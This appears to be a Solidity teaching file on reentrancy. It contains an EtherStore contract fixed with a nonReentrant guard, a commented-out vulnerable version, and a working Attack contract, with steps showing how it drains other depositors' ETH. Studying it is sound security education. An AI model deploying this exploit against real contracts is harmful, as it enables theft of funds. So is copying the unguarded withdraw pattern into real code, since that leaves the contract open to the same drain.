// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
    You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
    plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

import {console2} from "forge-std/Test.sol";
import {ReentrancyGuard} from "solmate/utils/ReentrancyGuard.sol";

// ===== Safe SC
// Just added nonReentrant modifier to `withdraw()` function
contract EtherStore is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public nonReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        console2.log("called by: ", msg.sender);

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
/// ========= Unsafe SC

// contract EtherStore {
//     mapping(address => uint256) public balances;

//     function deposit() public payable {
//         balances[msg.sender] += msg.value;
//     }

//     function withdraw() public {
//         uint256 bal = balances[msg.sender];
//         require(bal > 0);

//         (bool sent,) = msg.sender.call{value: bal}("");
//         require(sent, "Failed to send Ether");

//         console2.log("called by: ", msg.sender);

//         balances[msg.sender] = 0;
//     }

//     // Helper function to check the balance of this contract
//     function getBalance() public view returns (uint256) {
//         return address(this).balance;
//     }
// }

// contract Attack {
//     EtherStore public etherStore;

//     constructor(address _etherStoreAddress) {
//         etherStore = EtherStore(_etherStoreAddress);
//     }

//     // Fallback is called when EtherStore sends Ether to this contract.
//     fallback() external payable {
//         if (address(etherStore).balance >= 1 ether) {
//             etherStore.withdraw();
//         }
//     }

//     function attack() external payable {
//         require(msg.value >= 1 ether);
//         etherStore.deposit{value: 1 ether}();
//         etherStore.withdraw();
//     }

//     // Helper function to check the balance of this contract
//     function getBalance() public view returns (uint256) {
//         return address(this).balance;
//     }
// }
